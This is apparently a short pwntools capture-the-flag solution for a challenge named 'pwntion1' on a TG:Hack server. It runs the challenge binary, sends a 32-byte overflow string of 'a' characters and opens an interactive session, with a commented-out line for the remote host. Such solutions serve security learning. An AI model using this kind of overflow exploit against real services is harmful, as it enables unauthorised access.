from pwn import *

p=process('./pwntion1_public')
#p=remote('pwntion1.tghack.no',1061)

p.sendline('a'*0x20)
p.interactive()
